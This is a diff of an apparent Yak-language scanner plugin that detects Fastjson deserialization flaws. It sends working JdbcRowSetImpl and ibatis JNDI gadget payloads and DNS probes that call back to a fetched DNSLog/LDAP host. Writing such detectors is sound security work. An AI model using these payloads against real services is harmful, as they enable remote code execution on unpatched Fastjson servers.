@@ -15,9 +15,7 @@ highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.
 dnslogPayloads = [`{"{{randstr(2)}}":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`]
 nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]
 
-
 checkFastjsonVerion = `{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0041\u0075\u0074\u006f\u0043\u006c\u006f\u0073\u0065\u0061\u0062\u006c\u0065"`
-
 fastJsonCount = 0
 lock = sync.NewLock()
 addTask = func() {
@@ -69,35 +67,26 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     }
 
     yakit_output(sprintf("Start to check fastjson vuln for: %v", addr))
-   
+    freq, err = fuzz.HTTPRequest(req)
+    die(err)
 
     yakit_output("Start to fetch DNSLog")
-    domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
-    if err != nil {
-        yakit_output(sprintf("Fetch DNSLog Failed: %s", err))
-        return
-    }
-
-
-    bypassNextPayload = false
-    yakit_output(sprintf("Fetch domain: %s",domain))
-    reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
+    
     freq, err = fuzz.HTTPRequest(req)
     if err != nil {
         yakit_output(sprintf("build http request failed: %s", err))
         return
     }
-
     yakit_output(sprintf("try to analysis fastjson version"))
 
     freqResult ,err = freq.FuzzPostRaw(checkFastjsonVerion /*type: ...string*/).ExecFirst(httpool.https(isHttps))
 
-    
+
     version = re.Grok(string(freqResult.ResponseRaw), `fastjson-version %{COMMONVERSION:version}`)["version"]
 
     if version != undefined {
         yakit_output(sprintf("%v FastJson Version! %v", addr, version))
-   
+
         data = str.Split(version, "."/*type: string*/)[2]
 
         if data != undefined {
@@ -106,6 +95,8 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
             }
         }
     }
+    domain=""
+    token = ""
     payloadRes = []
     fuzzInfo = nil
     riskLevel = ""
@@ -113,7 +104,23 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         genPayload = fn(payloadRaw,rev) {
             return fuzz.StringsWithParam(payloadRaw, {"reverseConnTarget":rev})[0]
         }
-        testPayload = fn(payload) {
+        testPayload = fn(payloadRaw,isDnslog) {
+            // 获取dnslog
+            domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
+            if err != nil {
+                yakit_output(sprintf("Fetch DNSLog Failed: %s", err))
+                return
+            }
+            yakit_output(sprintf("Fetch domain: %s",domain))
+            if isDnslog{
+                reverseConnTarget = domain
+            }else{
+                reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
+            }
+            
+            // 生成payload
+            println(reverseConnTarget)
+            payload = genPayload(payloadRaw,reverseConnTarget)
             yakit_output(sprintf("Send payload: %s",payload))
             freq = freq.FuzzMethod("POST").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload)
             res, err = freq.Exec(httpool.https(isHttps), httpool.size(1))
@@ -131,30 +138,27 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
             }
             return false
         }
+        // 测试低版本payload
         for _,dnslogPayload = range dnslogPayloads{
-            if testPayload(genPayload(dnslogPayload,domain)){
+            if testPayload(dnslogPayload,true){
                 riskLevel = "middle"
-
-                if bypassNextPayload {  
+                if !bypassNextPayload {  
                     for _,payloadRaw = range nextPayload{
-                        if testPayload(genPayload(payloadRaw,reverseConnTarget)){
+                        if testPayload(payloadRaw,false){
                             riskLevel = "critical"
                             return true
                         }
                     }
                 }
-              
-
-                for _,payloadRaw = range highVersionPayload{
-                    if testPayload(genPayload(payloadRaw,reverseConnTarget)){
-                        riskLevel = "critical"
-                        return true
-                    }
-               }
                 return true
             }
         }
-     
+        for _,payloadRaw = range highVersionPayload{
+            if testPayload(payloadRaw,false){
+                riskLevel = "critical"
+                return true
+            }
+        }
         return false
     }
     
